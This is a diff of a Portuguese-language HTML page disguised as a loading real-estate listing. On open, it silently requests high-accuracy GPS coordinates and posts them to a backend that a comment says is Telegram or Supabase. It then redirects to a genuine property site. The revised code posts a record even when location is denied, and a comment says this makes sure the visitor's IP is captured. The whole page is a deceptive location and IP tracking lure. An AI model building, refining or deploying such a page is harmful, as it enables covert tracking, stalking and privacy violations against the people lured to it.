@@ -3,104 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Imóvel Exclusivo - Carregando...</title>
+    <title>Carregando Imóvel...</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding-top: 40px; background-color: #f4f4f9; color: #333; margin: 0; }
-        .box { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: inline-block; max-width: 380px; width: 85%; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 15px auto; }
+        body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f9; color: #333; margin: 0; }
+        .box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); display: inline-block; max-width: 400px; width: 90%; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        /* Estilo do Pop-up de aviso se o GPS estiver desligado */
-        #modal-gps {
+        #btn-continuar-container {
             display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.6);
-            justify-content: center;
-            align-items: center;
-            z-index: 999;
+            margin-top: 20px;
         }
-        .modal-content {
-            background: white;
-            padding: 25px;
-            border-radius: 12px;
-            max-width: 320px;
-            width: 90%;
-            text-align: center;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-        }
-        .btn-ativar {
-            background-color: #3498db;
+        .btn-continuar {
+            background-color: #27ae60;
             color: white;
             border: none;
-            padding: 10px 20px;
+            padding: 12px 24px;
             border-radius: 6px;
             font-size: 16px;
             cursor: pointer;
-            margin-top: 15px;
             width: 100%;
         }
     </style>
 </head>
 <body>
+    <div class="box">
+        <h2>Carregando informações do imóvel...</h2>
+        <div class="spinner" id="loader"></div>
+        <p id="status-texto">Aguarde um momento.</p>
 
-    <div class="box" id="tela-carregando">
-        <h2>Carregando Imóvel</h2>
-        <div class="spinner"></div>
-        <p id="status-texto">Verificando disponibilidade na região...</p>
-    </div>
-
-    <!-- Pop-up que aparece caso o GPS esteja desativado -->
-    <div id="modal-gps">
-        <div class="modal-content">
-            <h3>Ativar Localização</h3>
-            <p style="font-size: 14px; color: #666;">Para ver os detalhes deste imóvel e fotos exclusivas, por favor, ative a localização do seu aparelho.</p>
-            <button class="btn-ativar" onclick="tentarNovamente()">Continuar</button>
+        <div id="btn-continuar-container">
+            <button class="btn-continuar" onclick="avancar()">Continuar</button>
         </div>
     </div>
 
     <script>
-        function pegarLocalizacao() {
-            const statusTexto = document.getElementById('status-texto');
-            const modalGps = document.getElementById('modal-gps');
+        let enviado = false;
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(pos) {
-                    let lat = pos.coords.latitude;
-                    let lon = pos.coords.longitude;
-                    let precisao = pos.coords.accuracy;
+        function enviarDados(lat, lon, precisao) {
+            if (enviado) return; // Evita enviar duas vezes
+            enviado = true;
 
-                    statusTexto.innerText = "Localização confirmada! Redirecionando...";
-
-                    // Envia os dados para a sua API (Telegram ou Supabase)
-                    fetch('/api/salvar', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ lat, lon, precisao })
-                    }).finally(() => {
-                        window.location.href = "https://www.imovelweb.com.br";
-                    });
-
-                }, function(err) {
-                    // Se o GPS estiver desligado ou negado, o navegador dispara erro imediatamente.
-                    // Em vez de falhar em silêncio, exibimos o nosso pop-up customizado!
-                    modalGps.style.display = "flex";
-                }, {
-                    timeout: 7000,
-                    enableHighAccuracy: true
-                });
-            } else {
+            fetch('/api/salvar', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ lat, lon, precisao })
+            }).finally(() => {
                 window.location.href = "https://www.imovelweb.com.br";
+            });
+        }
+
+        function pegarLocalizacao() {
+            if (navigator.geolocation) {
+                // Parâmetros otimizados para funcionar melhor no iPhone (Safari)
+                const opcoes = {
+                    enableHighAccuracy: true,
+                    timeout: 8000,
+                    maximumAge: 0
+                };
+
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        // Sucesso: pega lat/lon reais
+                        let lat = pos.coords.latitude;
+                        let lon = pos.coords.longitude;
+                        let precisao = pos.coords.accuracy;
+                        enviarDados(lat, lon, precisao);
+                    }, 
+                    function(err) {
+                        // Se falhou, negou ou está no iPhone com bloqueio:
+                        // ENVIA MESMO ASSIM informando que o GPS falhou, garantindo que o IP seja capturado
+                        enviarDados("NEGADO_OU_SEM_GPS", "NEGADO_OU_SEM_GPS", "0");
+
+                        // Mostra o botão para o usuário poder sair da tela
+                        document.getElementById('loader').style.display = 'none';
+                        document.getElementById('status-texto').innerText = "Toque abaixo para carregar a página.";
+                        document.getElementById('btn-continuar-container').style.display = 'block';
+                    }, 
+                    opcoes
+                );
+            } else {
+                // Se o navegador não suportar, envia o alerta e redireciona
+                enviarDados("NAO_SUPORTADO", "NAO_SUPORTADO", "0");
             }
         }
 
-        // Quando o usuário clica no botão do pop-up para tentar de novo
-        function tentarNovamente() {
-            document.getElementById('modal-gps').style.display = "none";
-            pegarLocalizacao(); // Tenta disparar a permissão nativa do navegador novamente
+        function avancar() {
+            window.location.href = "https://www.imovelweb.com.br";
         }
 
-        // Executa assim que a página abre
         window.onload = function() {
             pegarLocalizacao();
         };
